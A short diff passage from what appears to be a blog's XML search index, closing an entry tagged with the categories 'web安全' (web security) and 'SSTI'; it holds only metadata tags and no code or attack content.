+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+        <tag>SSTI</tag>
+      </tags>
+  </entry>
 </search>
